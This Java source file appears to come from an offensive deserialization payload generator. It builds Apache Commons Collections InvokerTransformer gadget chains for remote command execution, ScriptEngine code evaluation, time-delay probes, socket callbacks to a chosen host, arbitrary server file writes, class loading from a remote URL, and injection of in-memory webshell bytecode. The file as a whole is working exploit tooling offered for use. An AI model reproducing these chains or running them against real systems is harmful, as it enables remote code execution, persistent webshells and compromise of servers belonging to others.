package com.ppp.sinks;

import com.ppp.JavaClassBuilder;
import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.annotation.JavaClassHelperType;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.CommandUtils;
import com.ppp.utils.FileUtils;
import com.ppp.utils.PayloadUtils;
import com.ppp.utils.maker.CryptoUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import javax.script.ScriptEngineManager;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.concurrent.TimeUnit;

/**
 * @author Whoopsunix
 */
@Sink({Sink.InvokerTransformer3})
public class InvokerTransformer3 {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
    public Transformer[] command(SinksHelper sinksHelper) {
        Object command = sinksHelper.getCommand();
        EnchantEnums commandType = sinksHelper.getCommandType();
        boolean split = sinksHelper.isSplit();
        String code = sinksHelper.getCode();
        String codeFile = sinksHelper.getCodeFile();

        Printer.blueInfo("command type: " + commandType);
        Printer.yellowInfo("command: " + command);

        Transformer[] transformers = new Transformer[0];
        switch (commandType) {
            default:
            case Runtime:
                Class execArgClass = String.class;
                if (split) {
                    execArgClass = String[].class;
                    command = CommandUtils.splitCommand((String) command);
                }
                transformers = new Transformer[]{
                        new ConstantTransformer(Runtime.class),
                        new InvokerTransformer("getMethod", new Class[]{
                                String.class, Class[].class}, new Object[]{
                                "getRuntime", new Class[0]}),
                        new InvokerTransformer("invoke", new Class[]{
                                Object.class, Object[].class}, new Object[]{
                                null, new Object[0]}),
                        new InvokerTransformer("exec",
                                new Class[]{execArgClass}, new Object[]{command}),
                        new ConstantTransformer(1)};
                break;

//            case ProcessBuilder:
//                if (os != null && os.equals(EnchantEnums.WIN)) {
//                    Printer.yellowInfo("os: " + os);
//                    transformers = new Transformer[]{
//                            new ConstantTransformer(ProcessBuilder.class),
//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
//                            new InvokerTransformer("newInstance", new Class[]{
//                                    Object[].class}, new Object[]{new Object[]{new String[]{"cmd.exe", "/c", command}}}),
//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
//                            new ConstantTransformer(1)};
//                } else {
//                    transformers = new Transformer[]{
//                            new ConstantTransformer(ProcessBuilder.class),
//                            new InvokerTransformer("getDeclaredConstructor", new Class[]{
//                                    Class[].class}, new Object[]{new Class[]{String[].class}}),
//                            new InvokerTransformer("newInstance", new Class[]{
//                                    Object[].class}, new Object[]{new Object[]{new String[]{"/bin/sh", "-c", command}}}),
//                            new InvokerTransformer("start", new Class[]{}, new Object[]{}),
//                            new ConstantTransformer(1)};
//                }
//                break;

            case ScriptEngine:
                if (codeFile != null) {
                    try {

                        FileInputStream fileInputStream = new FileInputStream(codeFile);
                        byte[] codeBytes = new byte[fileInputStream.available()];
                        fileInputStream.read(codeBytes);
                        fileInputStream.close();
                        code = new String(codeBytes);
                    } catch (Exception e) {
                        Printer.warn("File read error");
                    }
                } else if (code == null) {
                    if (split) {
                        code = String.format("x=new java.lang.ProcessBuilder;x.command(%s);x.start();", CommandUtils.splitCommandComma((String) command));
                    } else {
                        code = String.format("java.lang.Runtime.getRuntime().exec('%s');", command);
                    }
                }

                Printer.yellowInfo("code: " + code);

                transformers = new Transformer[]{
                        new ConstantTransformer(ScriptEngineManager.class),
                        new InstantiateTransformer(new Class[]{}, new Object[]{}),
                        new InvokerTransformer("getEngineByName", new Class[]{
                                String.class}, new Object[]{"JavaScript"}),
                        new InvokerTransformer("eval", new Class[]{
                                String.class}, new Object[]{code}),
                        new ConstantTransformer(1)};
                break;
        }

        return transformers;
    }

    /**
     * 线程延时
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Delay})
    public Transformer[] delay(SinksHelper sinksHelper) {
        EnchantEnums delay = sinksHelper.getDelay();
        Long delayTime = sinksHelper.getDelayTime();

        Printer.yellowInfo(String.format("System will delay response for %s seconds", delayTime));

        Transformer[] transformers = null;
        if (delay != null && delay.equals(EnchantEnums.Timeunit)) {
            transformers = new Transformer[]{
                    new ConstantTransformer(TimeUnit.class),
                    new InvokerTransformer("getDeclaredField", new Class[]{
                            String.class}, new Object[]{
                            "SECONDS"}),
                    new InvokerTransformer("get", new Class[]{Object.class}, new Object[]{null}),
                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
                    new ConstantTransformer(1)};
        } else {
            delayTime = delayTime * 1000L;
            transformers = new Transformer[]{
                    new ConstantTransformer(Thread.class),
                    new InvokerTransformer("getMethod", new Class[]{
                            String.class, Class[].class}, new Object[]{
                            "currentThread", null}),
                    new InvokerTransformer("invoke", new Class[]{
                            Object.class, Object[].class}, new Object[]{
                            null, null}),
                    new InvokerTransformer("sleep", new Class[]{long.class}, new Object[]{delayTime}),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * Socket 探测
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.Socket})
    public Transformer[] socket(SinksHelper sinksHelper) {
        String thost = sinksHelper.getHost();

        Printer.yellowInfo("System will initiate a socket request to " + thost);

        String[] hostSplit = thost.split("[:]");
        String host = hostSplit[0];
        int port = 80;
        if (hostSplit.length == 2)
            port = Integer.parseInt(hostSplit[1]);

        return new Transformer[]{
                new ConstantTransformer(Socket.class),
                new InstantiateTransformer(new Class[]{String.class, int.class}, new Object[]{host, port}),
                new ConstantTransformer(1)};
    }

    /**
     * 文件写入
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.FileWrite})
    public Transformer[] fileWrite(SinksHelper sinksHelper) throws Exception {
        String serverFilePath = sinksHelper.getServerFilePath();
        String localFilePath = sinksHelper.getLocalFilePath();
        String fileContent = sinksHelper.getFileContent();
        byte[] fileBytes = sinksHelper.getFileBytes();
        boolean split = sinksHelper.isSplit();
        boolean append = sinksHelper.isAppend();


        Printer.yellowInfo("Server file path: " + serverFilePath);

        byte[] contentBytes = new byte[]{};

        if (fileBytes != null) {
            contentBytes = fileBytes;
        } else {
            if (localFilePath != null) {
                Printer.yellowInfo("Local file path: " + localFilePath);
                try {
                    contentBytes = FileUtils.fileRead(localFilePath);
                    Printer.warn(String.format("File content length: %s, if too large, please use -split option", contentBytes.length));
                    if (split) {
                        int partSize = sinksHelper.getPartSize();
                        Printer.blueInfo("File will be split into " + partSize + "kb parts");
                        sinksHelper.setFileParts(FileUtils.splitFile(localFilePath, partSize));
                        sinksHelper.setLoop(true);
                    }
                } catch (Exception e) {
                    Printer.error("File read error");
                }
            } else if (fileContent != null) {
                Printer.yellowInfo("File content: " + fileContent);
                contentBytes = fileContent.getBytes();
            }
        }


        if (append) {
            Printer.blueInfo("bytes will be written to the end of the file");
            return new Transformer[]{
                    new ConstantTransformer(FileOutputStream.class),
                    new InstantiateTransformer(
                            new Class[]{String.class, boolean.class},
                            new Object[]{serverFilePath, true}
                    ),
                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
                    new ConstantTransformer(1)};
        } else {
            return new Transformer[]{
                    new ConstantTransformer(FileOutputStream.class),
                    new InstantiateTransformer(
                            new Class[]{String.class},
                            new Object[]{serverFilePath}
                    ),
                    new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{contentBytes}),
                    new ConstantTransformer(1)};
        }

    }

    /**
     * 远程类加载
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RemoteLoad})
    public Transformer[] remoteLoad(SinksHelper sinksHelper) throws Exception {
        String url = sinksHelper.getUrl();
        String className = sinksHelper.getClassName();
        Object constructor = sinksHelper.getConstructor();

        Printer.yellowInfo("Remote url: " + url);
        Printer.yellowInfo("Remote class name: " + className);

        Transformer[] transformers;

        // 构造方法
        if (constructor != null) {
            Printer.yellowInfo("Remote class constructor param: " + constructor);
            // 转为 Integer
            try {
                constructor = Integer.parseInt(constructor.toString());
            } catch (Exception e) {
            }

            Class constructorType = constructor.getClass();
            Object args = constructor;

            transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    new InstantiateTransformer(
                            new Class[]{URL[].class},
                            new Object[]{new URL[]{new URL(url)}}
                    ),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                    new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{constructorType}}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{args}}),
                    new ConstantTransformer(1)};
        } else {
            // 默认 static 无参构造
            transformers = new Transformer[]{
                    new ConstantTransformer(URLClassLoader.class),
                    new InstantiateTransformer(
                            new Class[]{URL[].class},
                            new Object[]{new URL[]{new URL(url)}}
                    ),
                    new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{className}),
                    new InstantiateTransformer(null, null),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }

    /**
     * 本地类加载
     *
     * @param sinksHelper
     * @return
     */
    @EnchantType({EnchantType.JavaClass})
    public Transformer[] JavaClass(SinksHelper sinksHelper) throws Exception {
        EnchantEnums loadFunction = sinksHelper.getLoadFunction();

        /**
         * 字节码加载
         */
        byte[] classBytes = null;
        String className = null;
        String loaderClassName = null;
        // 内存马
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        if (javaClassHelper != null) {
            classBytes = JavaClassBuilder.build(javaClassHelper);
            className = javaClassHelper.getCLASSNAME();
            if (javaClassHelper.getJavaClassHelperType().equals(JavaClassHelperType.MemShell)) {
                loaderClassName = javaClassHelper.getLoaderClassName();
            } else {
                loaderClassName = javaClassHelper.getCLASSNAME();
            }
        }

        if (classBytes == null) {
            Printer.error("Miss classBytes");
        }
        if (className == null) {
            Printer.error("Miss ClassName");
        }

        Transformer[] transformers;
        if (loadFunction != null && loadFunction.equals(EnchantEnums.RHINO)) {
            Printer.yellowInfo("Class load function is " + "org.mozilla.javascript.DefiningClassLoader");
            /**
             * org.mozilla.javascript.DefiningClassLoader.defineClass()
             * 需要 org.mozilla:rhino 依赖
             */
            transformers = new Transformer[]{
                    new ConstantTransformer(Class.forName("org.mozilla.javascript.DefiningClassLoader")),
                    new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
                    new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                    new InvokerTransformer("defineClass",
                            new Class[]{String.class, byte[].class}, new Object[]{className, classBytes}),
                    new InvokerTransformer("newInstance", new Class[]{}, new Object[]{}),
                    new ConstantTransformer(1)};
        } else {
            Printer.yellowInfo("Class load function is " + "javax.script.ScriptEngineManager");
            /**
             * javax.script.ScriptEngineManager
             */
            String b64 = CryptoUtils.base64encoder(classBytes);

//            String code = "data=\"" + b64 + "\";\n" +
//                    "aClass = java.lang.Class.forName(\"sun.misc.BASE64Decoder\");\n" +
//                    "object = aClass.newInstance();\n" +
//                    "bytes = aClass.getMethod(\"decodeBuffer\", java.lang.String.class).invoke(object, data);\n" +
//                    "classLoader=new java.lang.ClassLoader() {};\n" +
//                    "defineClassMethod = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", \"\".getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
//                    "defineClassMethod.setAccessible(true);\n" +
//                    "loadedClass = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
//                    "loadedClass.newInstance();";

//            String code = String.format("data=\"%s\";bytes=\"\".getBytes();" +
//                    "try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){" +
//                    "aClass=java.lang.Class.forName(\"sun.misc.BASE64Decoder\");" +
//                    "object=aClass.newInstance();" +
//                    "bytes=aClass.getMethod(\"decodeBuffer\",java.lang.String.class).invoke(object,data);}" +
//                    "classLoader=java.lang.Thread.currentThread().getContextClassLoader();" +
//                    "try{" +
//                    "clazz=classLoader.loadClass(\"%s\");" +
//                    "clazz.newInstance();" +
//                    "}catch(err){" +
//                    "try{" +
//                    "classLoader.loadClass(\"%s\");" +
//                    "clazz.newInstance();" +
//                    "}catch(e){" +
//                    "defineClassMethod=java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\",\"\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);" +
//                    "defineClassMethod.setAccessible(true);" +
//                    "loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);" +
//                    "clazz.newInstance();" +
//                    "}};", b64, className, loaderClassName);

            String code = PayloadUtils.loadByScriptEngine(b64, loaderClassName);

            transformers = new Transformer[]{
                    new ConstantTransformer(ScriptEngineManager.class),
                    new InstantiateTransformer(new Class[]{}, new Object[]{}),
                    new InvokerTransformer("getEngineByName", new Class[]{
                            String.class}, new Object[]{"JavaScript"}),
                    new InvokerTransformer("eval", new Class[]{
                            String.class}, new Object[]{code}),
                    new ConstantTransformer(1)};
        }

        return transformers;
    }
}
